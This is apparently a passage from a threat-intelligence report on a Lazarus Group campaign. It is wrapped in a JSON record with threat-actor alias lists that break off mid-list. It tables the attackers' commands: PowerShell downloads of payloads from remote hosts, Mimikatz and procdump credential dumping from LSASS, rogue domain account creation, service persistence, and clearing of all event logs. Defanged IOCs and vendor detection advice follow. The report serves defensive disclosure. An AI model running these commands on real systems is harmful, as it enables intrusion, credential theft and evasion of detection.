Files\\\"VMware\nView\\server\\broker\\webapps\\portal\\webclient\\z.tmp\n\n### Active Directory (AD) Recon\n\n\nArchive Collected\n[Data [T1560]](https://attack.mitre.org/techniques/T1560/)\n\n\nThe attackers also typically use a malicious batch (.bat) file called \"adfind.bat\" to execute adfind.exe on some of the\ninfected endpoints to get AD information from the endpoints.\n\n**Command** **Intent**\n\ncmd.exe /c <local_path>\\adfind.bat [Remote System Discovery [T1018]](https://attack.mitre.org/techniques/T1018/)\n\nadfind.exe -f (objectcategory=person) [Remote System Discovery [T1018]](https://attack.mitre.org/techniques/T1018/)\n\n\n-----\n\n**Command** **Intent**\n\nadfind.exe -f objectcategory=computer [Remote System Discovery [T1018]](https://attack.mitre.org/techniques/T1018/)\n\nadfind.exe -f (objectcategory=organizationalUnit) [Remote System Discovery [T1018]](https://attack.mitre.org/techniques/T1018/)\n\nadfind.exe -f (objectcategory=group) [Remote System Discovery [T1018]](https://attack.mitre.org/techniques/T1018/)\n\nadfind.exe -gcb -sc trustdmp [Domain Trust Discovery [T1482]](https://attack.mitre.org/techniques/T1482/)\n\nWe also observed the use of dsquery to obtain similar information.\n\n**Command** **Intent**\n\n\ncmd.exe /Q /c echo dsquery computer ^> \\\\127.0.0.1\\C$\\<impacket_log_file>\n2^>^&1\n\ncmd.exe /Q /c echo dsquery group -name GroupName ^> \\\\127.0.0.1\\C$\\\n<impacket_log_file> 2^>^&1\n\ncmd.exe /Q /c echo dsquery computer -name ComputerName ^> \\\\127.0.0.1\\C$\\\n<impacket_log_file> 2^>^&1\n\ncmd.exe /Q /c echo dsquery user -name UserName ^> \\\\127.0.0.1\\C$\\\n<impacket_log_file>t 2^>^&1\n\n### Unauthorized account creations\n\n\nDomain Account Discovery\n\n[[T1087/002]](https://attack.mitre.org/techniques/T1087/002/)\n\nDomain Account Discovery\n\n[[T1087/002]](https://attack.mitre.org/techniques/T1087/002/)\n\nDomain Account Discovery\n\n[[T1087/002]](https://attack.mitre.org/techniques/T1087/002/)\n\nDomain Account Discovery\n\n[[T1087/002]](https://attack.mitre.org/techniques/T1087/002/)\n\n\nIn most instances, the attackers instrumented the reverse shell to create their own user accounts on the endpoints\nthey had initial access to. Similar activity was also seen being conducted via the VSingle implant as it was\npropagated across an enterprise.\n\n**Command** **Intent**\n\nnet1 group /domain [Domain discovery [T1087/002]](https://attack.mitre.org/techniques/T1087/002/)\n\nnet1 user <username> <password> /domain [Create Account [T1136/002]](https://attack.mitre.org/techniques/T1136/002/)\n\nnet1 user <username> /active:yes /domain [Create Account [T1136/002]](https://attack.mitre.org/techniques/T1136/002/)\n\nnet1 group <groupname> /add /domain [Create Account [T1136/002]](https://attack.mitre.org/techniques/T1136/002/)\n\nnet1 group <groupname> <username> /add /domain [Create Account [T1136/002]](https://attack.mitre.org/techniques/T1136/002/)\n\n### Additional tools used\n\nIn some cases, the attackers deployed commonly used tools often seen from other threat actors.\n\n**Mimikatz**\n\nThe attackers downloaded the Mimikatz tool from their server, inside a .rar archive protected with a password,\nwhich prevents any kind of detection by network intrusion prevention systems.\n\n\n-----\n\n**Command** **Intent**\n\n\npowershell -exec bypass -command (New-Object\nSystem.Net.WebClient).DownloadFile('http://<remote_location>/mi.tmp',\n'<local_path>\\m.tmp')\n\npowershell -exec bypass -command (New-Object\nSystem.Net.WebClient).DownloadFile('http://<remote_location>/mi64.tmp',\n'<local_path>\\mi.tmp')\n\npowershell -exec bypass -command (New-Object\nSystem.Net.WebClient).DownloadFile('http://<remote_location>/mm.rar',\n'<local_path>\\mm.tmp')\n\n\nDownload Payloads\n\n[[T1608/001]](https://attack.mitre.org/techniques/T1608/001/)\n\nDownload Payloads\n\n[[T1608/001]](https://attack.mitre.org/techniques/T1608/001/)\n\nDownload Payloads\n\n[[T1608/001]](https://attack.mitre.org/techniques/T1608/001/)\n\n\n<local_path>\\rar.exe e <local_path>\\m.tmp <local_path>\\ -p<password> [Extract files [T1140]](https://attack.mitre.org/techniques/T1140/)\n\n<local_path>\\mi.exe privilege::debug sekurlsa::logonPasswords exit OS Credential\nDumping\n\n[[T1003/001]](https://attack.mitre.org/techniques/T1003/001/)\n\n**Procdump**\n\nAlong with Mimikatz, the attackers also used procdump to dump the LSASS memory to a file on disk.\n\n**Command** **Intent**\n\n\npowershell -exec bypass -command (New-Object\nSystem.Net.WebClient).DownloadFile('http://<remote_location>/pd64.tmp',\n'<local_path>\\pd.tmp')\n\n\nDownload Payloads\n\n[[T1608/001]](https://attack.mitre.org/techniques/T1608/001/)\n\n\nren <local_path>\\pd.tmp pd64.exe Rename files\n\n<local_path>\\pd64.exe -accepteula -ma lsass <local_path>\\z_pd.dmp OS Credential\nDumping\n\n[[T1003/001]](https://attack.mitre.org/techniques/T1003/001/)\n\n**Socks proxy**\n\nIn another instance, the attackers downloaded and set up a SOCKS proxy on the local endpoint, including the use\nof [3proxy.](https://github.com/3proxy/3proxy)\n\n**Command** **Intent**\n\n\npowershell -exec bypass -command (New-Object\nSystem.Net.WebClient).DownloadFile('http://<remote_location>/spr.tmp',\n'<local_path>\\spr.tmp')\n\n\nDownload\nPayloads\n\n[[T1608/001]](https://attack.mitre.org/techniques/T1608/001/)\n\n\n<local_path>\\rar.exe e <local_path>\\spr.tmp <local_path_2> -p<password> [Extract files [T1140]](https://attack.mitre.org/techniques/T1140/)\n\n<local_path_2>\\msconf.exe -i 84[.]38[.]133[.]145 -p <Port_number> [Proxy [T1090]](https://attack.mitre.org/techniques/T1090/)\n\n### Implant deployment and lateral movement\n\n\n-----\n\nAcross the first endpoints compromised in the enterprises, we observed the attackers downloading their custom\nimplants from remote locations and deploying and persisting them on the systems.\n\n**Command** **Intent**\n\n\nWMIC /node:<Computer_Name> process call create \"powershell.exe (New-Object\nSystem.Net.Webclient).DownloadFile('<remote_location>/svhostw.exe','<local_path>\\\\svhostww.exe')\"\n\nsc create <service_name> type= own type= interact start= auto error= ignore binpath= cmd /K start\n<local_path_2>\\\\svhostww.exe\n\n\nDownload\nPayloads\n\n[[T1608/001]](https://attack.mitre.org/techniques/T1608/001/)\n\nPersistence\n\n[[T1543/003]](https://attack.mitre.org/techniques/T1543/003/)\n\n\nOn the endpoints that were breached by performing lateral movement from an already compromised host, the\nimplants were deployed either from a remote external location or the source host itself by opening up interactive\nshells and the use of implacket tools:\n\n**Command** **Intent**\n\npowershell.exe Enter-PSSession Remote Access\n\n[[T1219]](https://attack.mitre.org/techniques/T1219/)\n\n\npowershell.exe Invoke-Command -ComputerName <ComputerName> -ScriptBlock {cmd.exe\n/c dir}\n\npython wmiexec.py <userid>:<password>@<local_IP_of_another_endpoint> 1>\n\\\\127.0.0.1\\ADMIN$\\<impacket_log_file> 2>&1\n\n### Cleanup\n\n\nRemote Access\n\n[[T1219]](https://attack.mitre.org/techniques/T1219/)\n\nRemote Access\n\n[[T1219]](https://attack.mitre.org/techniques/T1219/)\n\n\nOnce the backdoors and implants were persisted and activated on the endpoint, the reverse shell used to perform\n[cleanup [T1070], this included deleting all files in the infection folder along with the termination of the powershell](https://attack.mitre.org/techniques/T1070/)\n[tasks. The attacker-created accounts were removed and, finally, the Windows Event logs [T1070/001] would be](https://attack.mitre.org/techniques/T1070/001/)\npurged with the command below.\n```\nfor /F tokens=* %1 in ('wevtutil.exe el') DO wevtutil.exe cl %1 1> \\\\127.0.0.1\\ADMIN$\\<log_file_name> 2>&1\n\n### Manual operations\n\n```\nIn multiple instances, the attackers mistyped commands on the infected endpoint via the reverse shell, indicating\nthat the commands were being served by an operator manually operating the infections:\n\n**ip config /all**\n\nnet suer\n\nnetstat -noa | finstr 3389\n\n**powrshell.exe Get-AdUser -Filter * -Properties * | Select Name, logonCount**\n\n**powrshell.exe Get-AdComputer -Filter * -Properties * | select Name, LastLogonDate, lastLogon, IPv4Address**\n\n\n-----\n\n## Coverage\n\nWays our customers can detect and block this threat are listed below.\n\n[Cisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware](https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/index.html)\n[detailed in this post. Try Secure Endpoint for free here.](https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/free-trial.html?utm_medium%3Dweb-referral?utm_source%3Dcisco%26utm_campaign%3Damp-free-trial%26utm_term%3Dpgm-talos-trial%26utm_content%3Damp-free-trial)\n\n[Cisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in](https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html)\nthese attacks.\n\n[Cisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their](https://www.cisco.com/c/en/us/products/security/email-security/index.html)\ncampaign. You can try Secure Email for free [here.](https://www.cisco.com/c/en/us/products/security/cloud-mailbox-defense?utm_medium%3Dweb-referral%26utm_source%3Dcisco%26utm_campaign%3Dcmd-free-trial-request%26utm_term%3Dpgm-talos-trial)\n\n[Cisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat](https://www.cisco.com/c/en/us/products/security/firewalls/index.html)\nDefense Virtual, [Adaptive Security Appliance and](https://www.cisco.com/c/en/us/products/security/adaptive-security-appliance-asa-software/index.html) [Meraki MX can detect malicious activity associated with this](https://meraki.cisco.com/products/appliances)\nthreat.\n\n[Cisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco](https://www.cisco.com/c/en/us/products/security/threat-grid/index.html)\nSecure products.\n\n[Umbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and](https://umbrella.cisco.com/)\n[URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella here.](https://signup.umbrella.com/?utm_medium%3Dweb-referral?utm_source%3Dcisco%26utm_campaign%3Dumbrella-free-trial%26utm_term%3Dpgm-talos-trial%26utm_content%3Dautomated-free-trial)\n\n\n-----\n\n[Cisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites](https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html)\nand tests suspicious sites before users access them.\n\nAdditional protections with context to your specific environment and threat data are available from the Firewall\nManagement Center.\n\n[Cisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your](https://signup.duo.com/?utm_source%3Dtalos%26utm_medium%3Dreferral%26utm_campaign%3Dduo-free-trial)\nnetwork.\n\nOpen-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack\n[available for purchase on Snort.org.](https://www.snort.org/products)\n\n**Orbital Queries**\n\n[Cisco Secure Endpoint users can use Orbital Advanced Search to run complex OSqueries to see if their endpoints](https://orbital.amp.cisco.com/help/)\n[are infected with this specific threat. For specific OSqueries on this threat, click here and](https://github.com/Cisco-Talos/osquery_queries/blob/master/win_malware/magicrat_file_artifact.yaml) [here.](https://github.com/Cisco-Talos/osquery_queries/blob/master/win_malware/vsingle_mutex.yaml)\n\n## IOCS\n\n**The IOC list is also available in Talos' Github repo** **[here.](https://github.com/Cisco-Talos/IOCs/tree/main/2022/09)**\n\n### VSingle\n\n586F30907C3849C363145BFDCDABE3E2E4688CBD5688FF968E984B201B474730\n\n### MagicRAT\n\n8ce219552e235dcaf1c694be122d6339ed4ff8df70bf358cd165e6eb487ccfc5\n\nc2904dc8bbb569536c742fca0c51a766e836d0da8fac1c1abd99744e9b50164f\n\ndda53eee2c5cb0abdbf5242f5e82f4de83898b6a9dd8aa935c2be29bafc9a469\n\n90fb0cd574155fd8667d20f97ac464eca67bdb6a8ee64184159362d45d79b6a4\n\n### YamaBot\n\nf226086b5959eb96bd30dec0ffcbf0f09186cd11721507f416f1c39901addafb\n\n### Procdump\n\n16F413862EFDA3ABA631D8A7AE2BFFF6D84ACD9F454A7ADAA518C7A8A6F375A5\n\n05732E84DE58A3CC142535431B3AA04EFBE034CC96E837F93C360A6387D8FAAD\n\n### Mimikatz\n\n6FBB771CD168B5D076525805D010AE0CD73B39AB1F4E6693148FE18B8F73090B\n\n912018AB3C6B16B39EE84F17745FF0C80A33CEE241013EC35D0281E40C0658D9\n\nCAF6739D50366E18C855E2206A86F64DA90EC1CDF3E309AEB18AC22C6E28DC65\n\n### 3Proxy\n\n2963a90eb9e499258a67d8231a3124021b42e6c70dacd3aab36746e51e3ce37e\n\n### PuTTY plink\n\n2AA1BBBE47F04627A8EA4E8718AD21F0D50ADF6A32BA4E6133EE46CE2CD13780\n\n5A73FDD0C4D0DEEA80FA13121503B477597761D82CF2CFB0E9D8DF469357E3F8\n\n\n-----\n\n### Adfind\n\nC92C158D7C37FEA795114FA6491FE5F145AD2F8C08776B18AE79DB811E8E36A3\n\n### IPs\n\n104[.]155[.]149[.]103\n\n40[.]121[.]90[.]194\n185[.]29[.]8[.]162\n\n146[.]4[.]21[.]94\n\n46[.]183[.]221[.]109\n\n84[.]38[.]133[.]145\n\n109[.]248[.]150[.]13\n\n155[.]94[.]210[.]11\n\n192[.]186[.]183[.]133\n\n54[.]68[.]42[.]4\n\n84[.]38[.]133[.]145\n\n213[.]180[.]180[.]154\n\n### URLS\n\nhxxp[://]104[.]155[.]149[.]103/2-443[.]ps1\n\nhxxp[://]104[.]155[.]149[.]103/8080[.]ps1\n\nhxxp[://]104[.]155[.]149[.]103/mi64[.]tmp\n\nhxxp[://]104[.]155[.]149[.]103/mi[.]tmp\n\nhxxp[://]104[.]155[.]149[.]103/mm[.]rar\n\nhxxp[://]104[.]155[.]149[.]103/pd64[.]tmp\n\nhxxp[://]104[.]155[.]149[.]103/rar[.]tmp\n\nhxxp[://]104[.]155[.]149[.]103/spr[.]tmp\n\nhxxp[://]104[.]155[.]149[.]103/t[.]tmp\n\nhxxp[://]104[.]155[.]149[.]103/update[.]tmp\n\nhxxp[://]109[.]248[.]150[.]13:8080/1\n\nhxxp[://]146[.]4[.]21[.]94/tmp/data_preview/virtual[.]php\n\nhxxp[://]185[.]29[.]8[.]162:443/1[.]tmp\n\nhxxp[://]40[.]121[.]90[.]194/11[.]jpg\n\nhxxp[://]40[.]121[.]90[.]194/300dr[.]cert\nhxxp[://]40[.]121[.]90[.]194/b[.]cert\n\nhxxp[://]40[.]121[.]90[.]194/qq[.]cert\n\nhxxp[://]40[.]121[.]90[.]194/ra[.]cert\n\nhxxp[://]40[.]121[.]90[.]194/Rar[.]jpg\n\nhxxp[://]40[.]121[.]90[.]194/tt[.]rar\n\nhxxp[://]46[.]183[.]221[.]109//dfdfdfdfdfdfdfdfdfaflakjdfljaldjfladfljaldkfjlajdsflajdskf/huntertroy[.]exe\n\nhxxp[://]46[.]183[.]221[.]109//dfdfdfdfdfdfdfdfdfaflakjdfljaldjfladfljaldkfjlajdsflajdskf/svhostw[.]exe\n\nhxxp[://]84[.]38[.]133[.]145/board[.]html\n\nhxxp[://]84[.]38[.]133[.]145/header[.]xml\n\nhxxp[://]www[.]ajoa[.]org/home/manager/template/calendar[.]php\n\nhxxp[://]www[.]ajoa[.]org/home/rar[.]tmp\n\nhxxp[://]www[.]ajoa[.]org/home/tmp[.]ps1\n\nhxxp[://]www[.]ajoa[.]org/home/ztt[.]tmp\n\nhxxp[://]www[.]orvi00[.]com/ez/admin/shop/powerline[.]tmp\n\n### VSingle C2s\n\n\n-----\n\nhxxps[://]tecnojournals[.]com/review\nhxxps[://]semiconductboard[.]com/xml\n\nhxxp[://]cyancow[.]com/find\n\n### MagicRAT C2s\n\nhxxp[://]155[.]94[.]210[.]11/news/page[.]php\n\nhxxp[://]192[.]186[.]183[.]133/bbs/board[.]php\n\nhxxp[://]213[.]32[.]46[.]0/board[.]php\n\nhxxp[://]54[.]68[.]42[.]4/mainboard[.]php\n\nhxxp[://]84[.]38[.]133[.]145/apollom/jeus[.]php\n\nhxxp[://]mudeungsan[.]or[.]kr/gbbs/bbs/template/g_botton[.]php\n\nhxxp[://]www[.]easyview[.]kr/board/Kheader[.]php\n\nhxxp[://]www[.]easyview[.]kr/board/mb_admin[.]php\n\n### YamaBot C2s\n\nhxxp[://]213[.]180[.]180[.]154/editor/session/aaa000/support[.]php\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-09-08 - Lazarus and the tale of three RATs.pdf"
    ],
    "report_names": [
        "2022-09-08 - Lazarus and the tale of three RATs.pdf"
    ],
    "threat_actors": [
        {
            "id": "838f6ced-12a4-4893-991a-36d231d96efd",
            "created_at": "2022-10-25T15:50:23.347455Z",
            "updated_at": "2025-03-27T02:00:55.449316Z",
            "deleted_at": null,
            "main_name": "Andariel",
            "aliases": [
                "Andariel",
                "Silent Chollima",
                "PLUTONIUM",
                "Onyx Sleet"
            ],
            "source_name": "MITRE:Andariel",
            "tools": [
                "Rifdoor",
                "gh0st RAT"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "a13b5ca4-fb52-44a9-aa5a-595eca6789ed",
            "created_at": "2022-10-25T15:50:23.4331Z",
            "updated_at": "2025-03-27T02:00:55.46701Z",
            "deleted_at": null,
            "main_name": "Sharpshooter",
            "aliases": [
                "Sharpshooter"
            ],
            "source_name": "MITRE:Sharpshooter",
            "tools": [
                "Rising Sun"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "110e7160-a8cc-4a66-8550-f19f7d418117",
            "created_at": "2023-01-06T13:46:38.427592Z",
            "updated_at": "2025-03-27T02:00:02.830659Z",
            "deleted_at": null,
            "main_name": "Silent Chollima",
            "aliases": [
                "Subgroup: Andariel",
                "Onyx Sleet",
                "PLUTONIUM",
                "OperationTroy",
                "Guardian of Peace",
                "GOP",
                "WHOis Team",
                "Andariel"
            ],
            "source_name": "MISPGALAXY:Silent Chollima",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "32a223a8-3c79-4146-87c5-8557d38662ae",
            "created_at": "2022-10-25T15:50:23.703698Z",
            "updated_at": "2025-03-27T02:00:55.528031Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Lazarus Group",
                "Labyrinth Chollima",
                "HIDDEN COBRA",
                "Guardians of Peace",
                "NICKEL ACADEMY",
                "Diamond Sleet"
            ],
            "source_name": "MITRE:Lazarus Group",
            "tools": [
                "RawDisk",
                "Proxysvc",
                "BADCALL",
                "FALLCHILL",
                "WannaCry",
                "HOPLIGHT",
                "TYPEFRAME",
                "Dtrack",
                "HotCroissant",
                "HARDRAIN",
                "Dacls",
                "KEYMARBLE",
                "TAINTEDSCRIBE",
                "AuditCred",
                "netsh",
                "ECCENTRICBANDWAGON",
                "AppleJeus",
                "BLINDINGCAN",
                "ThreatNeedle",
                "Volgmer",
                "Cryptoistic",
                "RATANKBA",
                "Bankshot",
                "Torisma",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "4a502340-ae29-4a3a-8142-7fbbc2ec79b5",
            "created_at": "2024-05-01T02:03:08.138302Z",
            "updated_at": "2025-03-27T02:05:17.416542Z",
            "deleted_at": null,
            "main_name": "NICKEL HYATT",
            "aliases": [
                "Dark Seoul",
                "Jumpy Pisces ",
                "Onyx Sleet ",
                "RIFLE Campaign",
                "Silent Chollima ",
                "Andariel"
            ],
            "source_name": "Secureworks:NICKEL HYATT",
            "tools": [
                " DTrack",
                " Rifle",
                " UnitBot",
                " Valefor",
                "ActiveX 0-day"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "9e767b38-12ae-4ef7-9878-5ce1701066d7",
            "created_at": "2024-05-01T02:03:08.131819Z",
            "updated_at": "2025-03-27T02:05:17.413497Z",
            "deleted_at": null,
            "main_name": "NICKEL ACADEMY",
            "aliases": [
                "COVELLITE ",
                "CTG-2460 ",
                "Diamond Sleet ",
                "Guardians of Peace",
                "HIDDEN COBRA ",
                "High Anonymous",
                "Labyrinth Chollima ",
                "NNPT Group",
                "New Romanic Cyber Army Team",
                "Temp.Hermit ",
                "The Lazarus Group ",
                "UNC577 ",
                "Who Am I?",
                "Whois Team",
                "ZINC ",
                "Black Artemis "
            ],
            "source_name": "Secureworks:NICKEL ACADEMY",
            "tools": [
                " DarkMessenger",
                " Destover",
                " Duuzer",
                " HOPLIGHT",
                " Joanap",
                " KorHigh",
                " LiveJinx",
                " Volgmer",
                "Brambul"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8bc1a044-a23b-4904-903c-13f463605cb3",
            "created_at": "2024-05-01T02:03:08.136237Z",
            "updated_at": "2025-03-27T02:05:17.415795Z",
            "deleted_at": null,
            "main_name": "NICKEL GLADSTONE",
            "aliases": [
                "Bluenoroff ",
                "CTG-6459 ",
                "Citrine Sleet ",
                "HIDDEN COBRA ",
                "Lazarus Group",
                "Sapphire Sleet ",
                "Stardust Chollima ",
                "APT38 "
            ],
            "source_name": "Secureworks:NICKEL GLADSTONE",
            "tools": [
                " Bankshot",
                " CATCH22",
                " CCGC_Proxy",
                " Cur1Agent",
                " Ratankba",
                " Server_TrafficForwarder",
                " Wcry",
                "AlphaNC"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "874ada20-4ca8-4997-9f2e-e3933742d09c",
            "created_at": "2023-01-06T13:46:38.857642Z",
            "updated_at": "2025-03-27T02:00:02.936711Z",
            "deleted_at": null,
            "main_name": "Operation Sharpshooter",
            "aliases": [],
            "source_name": "MISPGALAXY:Operation Sharpshooter",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bc6e3644-3249-44f3-a277-354b7966dd1b",
            "created_at": "2022-10-25T16:07:23.760559Z",
            "updated_at": "2025-03-27T02:02:09.968605Z",
            "deleted_at": null,
            "main_name": "Andariel",
            "aliases": [
                "APT 45",
                "Andariel",
                "Jumpy Pisces",
                "Onyx Sleet",
                "Operation BLACKMINE",
                "Operation BLACKSHEEP/Phase 3.",
                "Operation Blacksmith",
                "Operation DESERTWOLF/Phase 3",
                "Operation GHOSTRAT",
                "Operation GoldenAxe",
                "Operation INITROY/Phase 1",
                "Operation INITROY/Phase 2",
                "Operation Mayday",
                "Operation VANXATM",
                "Operation XEDA",
                "Plutonium",
                "Silent Chollima",
                "Stonefly"
            ],
            "source_name": "ETDA:Andariel",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f32df445-9fb4-4234-99e0-3561f6498e4e",
            "created_at": "2022-10-25T16:07:23.756373Z",
            "updated_at": "2025-03-27T02:02:09.966155Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "APT-C-26",
                "ATK 3",
                "Appleworm",
                "Citrine Sleet",
                "DEV-0139",
                "Diamond Sleet",
                "Gleaming Pisces",
                "Gods Apostles",
                "Gods Disciples",
                "Group 77",
                "Guardians of Peace",
                "Hastati Group",
                "Hidden Cobra",
                "ITG03",
                "Jade Sleet",
                "Labyrinth Chollima",
                "Lazarus Group",
                "NewRomanic Cyber Army Team",
                "Operation 99",
                "Operation AppleJeus",
                "Operation AppleJeus sequel",
                "Operation Blockbuster: Breach of Sony Pictures Entertainment",
                "Operation CryptoCore",
                "Operation Dream Job",
                "Operation Dream Magic",
                "Operation Flame",
                "Operation GhostSecret",
                "Operation In(ter)caption",
                "Operation LolZarus",
                "Operation Marstech Mayhem",
                "Operation No Pineapple!",
                "Operation North Star",
                "Operation Phantom Circuit",
                "Operation Sharpshooter",
                "Operation Ten Days of Rain / DarkSeoul",
                "Operation Troy",
                "SectorA01",
                "Slow Pisces",
                "TA404",
                "TraderTraitor",
                "UNC2970",
                "UNC4034",
                "UNC4736",
                "UNC4899",
                "UNC577",
                "Whois Hacking Team"
            ],
            "source_name": "ETDA:Lazarus Group",
            "tools": [
                "3CX Backdoor",
                "3Rat Client",
                "3proxy",
                "AIRDRY",
                "ARTFULPIE",
                "ATMDtrack",
                "AlphaNC",
                "Alreay",
                "Andaratm",
                "AngryRebel",
                "AppleJeus",
                "Aryan",
                "AuditCred",
                "BADCALL",
                "BISTROMATH",
                "BLINDINGCAN",
                "BTC Changer",
                "BUFFETLINE",
                "BanSwift",
                "Bankshot",
                "Bitrep",
                "Bitsran",
                "BlindToad",
                "Bookcode",
                "BootWreck",
                "BottomLoader",
                "Brambul",
                "BravoNC",
                "Breut",
                "COLDCAT",
                "COPPERHEDGE",
                "CROWDEDFLOUNDER",
                "Castov",
                "CheeseTray",
                "CleanToad",
                "ClientTraficForwarder",
                "CollectionRAT",
                "Concealment Troy",
                "Contopee",
                "CookieTime",
                "Cyruslish",
                "DAVESHELL",
                "DBLL Dropper",
                "DLRAT",
                "DRATzarus",
                "DRATzarus RAT",
                "Dacls",
                "Dacls RAT",
                "DarkComet",
                "DarkKomet",
                "DeltaCharlie",
                "DeltaNC",
                "Dembr",
                "Destover",
                "DoublePulsar",
                "Dozer",
                "Dtrack",
                "Duuzer",
                "DyePack",
                "ECCENTRICBANDWAGON",
                "ELECTRICFISH",
                "Escad",
                "EternalBlue",
                "FALLCHILL",
                "FYNLOS",
                "FallChill RAT",
                "Farfli",
                "Fimlis",
                "FoggyBrass",
                "FudModule",
                "Fynloski",
                "Gh0st RAT",
                "Ghost RAT",
                "Gopuram",
                "HARDRAIN",
                "HIDDEN COBRA RAT/Worm",
                "HLOADER",
                "HOOKSHOT",
                "HOPLIGHT",
                "HOTCROISSANT",
                "HOTWAX",
                "HTTP Troy",
                "Hawup",
                "Hawup RAT",
                "Hermes",
                "HotCroissant",
                "HotelAlfa",
                "Hotwax",
                "HtDnDownLoader",
                "Http Dr0pper",
                "ICONICSTEALER",
                "Joanap",
                "Jokra",
                "KANDYKORN",
                "KEYMARBLE",
                "Kaos",
                "KillDisk",
                "KillMBR",
                "Koredos",
                "Krademok",
                "LIGHTSHIFT",
                "LIGHTSHOW",
                "LOLBAS",
                "LOLBins",
                "Lazarus",
                "LightlessCan",
                "Living off the Land",
                "MATA",
                "MBRkiller",
                "MagicRAT",
                "Manuscrypt",
                "Mimail",
                "Mimikatz",
                "Moudour",
                "Mydoom",
                "Mydoor",
                "Mytob",
                "NACHOCHEESE",
                "NachoCheese",
                "NestEgg",
                "NickelLoader",
                "NineRAT",
                "Novarg",
                "NukeSped",
                "OpBlockBuster",
                "PCRat",
                "PEBBLEDASH",
                "PLANKWALK",
                "POOLRAT",
                "PSLogger",
                "PhanDoor",
                "Plink",
                "PondRAT",
                "PowerBrace",
                "PowerRatankba",
                "PowerShell RAT",
                "PowerSpritz",
                "PowerTask",
                "Preft",
                "ProcDump",
                "Proxysvc",
                "PuTTY Link",
                "QUICKRIDE",
                "QUICKRIDE.POWER",
                "Quickcafe",
                "QuiteRAT",
                "R-C1",
                "ROptimizer",
                "Ratabanka",
                "RatabankaPOS",
                "Ratankba",
                "RatankbaPOS",
                "RawDisk",
                "RedShawl",
                "Rifdoor",
                "Rising Sun",
                "Romeo-CoreOne",
                "RomeoAlfa",
                "RomeoBravo",
                "RomeoCharlie",
                "RomeoCore",
                "RomeoDelta",
                "RomeoEcho",
                "RomeoFoxtrot",
                "RomeoGolf",
                "RomeoHotel",
                "RomeoMike",
                "RomeoNovember",
                "RomeoWhiskey",
                "Romeos",
                "RustBucket",
                "SHADYCAT",
                "SHARPKNOT",
                "SIGFLIP",
                "SIMPLESEA",
                "SLICKSHOES",
                "SORRYBRUTE",
                "SUDDENICON",
                "SUGARLOADER",
                "SheepRAT",
                "SierraAlfa",
                "SierraBravo",
                "SierraCharlie",
                "SierraJuliett-MikeOne",
                "SierraJuliett-MikeTwo",
                "SimpleTea",
                "SimplexTea",
                "SmallTiger",
                "Stunnel",
                "TAINTEDSCRIBE",
                "TAXHAUL",
                "TFlower",
                "TOUCHKEY",
                "TOUCHMOVE",
                "TOUCHSHIFT",
                "TOUCHSHOT",
                "TWOPENCE",
                "TYPEFRAME",
                "Tdrop",
                "Tdrop2",
                "ThreatNeedle",
                "Tiger RAT",
                "TigerRAT",
                "Trojan Manuscript",
                "Troy",
                "TroyRAT",
                "VEILEDSIGNAL",
                "VHD",
                "VHD Ransomware",
                "VIVACIOUSGIFT",
                "VSingle",
                "ValeforBeta",
                "Volgmer",
                "Vyveva",
                "W1_RAT",
                "Wana Decrypt0r",
                "WanaCry",
                "WanaCrypt",
                "WanaCrypt0r",
                "WannaCry",
                "WannaCrypt",
                "WannaCryptor",
                "WbBot",
                "Wcry",
                "Win32/KillDisk.NBB",
